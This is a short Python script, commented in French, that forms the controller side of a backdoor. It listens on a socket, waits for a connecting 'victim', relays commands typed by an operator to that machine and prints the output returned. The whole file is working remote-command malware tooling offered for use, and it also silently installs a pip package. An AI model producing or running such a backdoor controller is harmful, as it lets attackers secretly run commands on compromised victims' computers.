import socket, pip, sys
# On essaye d'importer les dépendances, et si elles sont pas dispos on les installe
# pour l'utilisateur courant.
def require(*packages):
    for package in packages:
        try:
            if not isinstance(package, str):
                import_name, install_name = package
            else:
                import_name = install_name = package
            __import__(import_name)
        except ImportError:

            cmd = ['install', install_name]
            if not hasattr(sys, 'real_prefix'):
                cmd.append('--user')
            pip.main(cmd)

require('pyfiglet')
import pyfiglet

ip = '127.0.0.1'
port = 6666

print(pyfiglet.figlet_format("Backdoor Server"))

server = socket.socket()
server.bind((ip,port))
print("Wait victim")
server.listen(1)
client, client_addr = server.accept()

while True:
    command = input('Enter Command : ')
    command = command.encode()
    client.send(command)
    print("Command : %s send to %s" % (command, client_addr))
#     if command == "close".encode():
#         server.close()
#         break
    output = client.recv(1024)
    output = output.decode()
    print("Return: %s" % output)

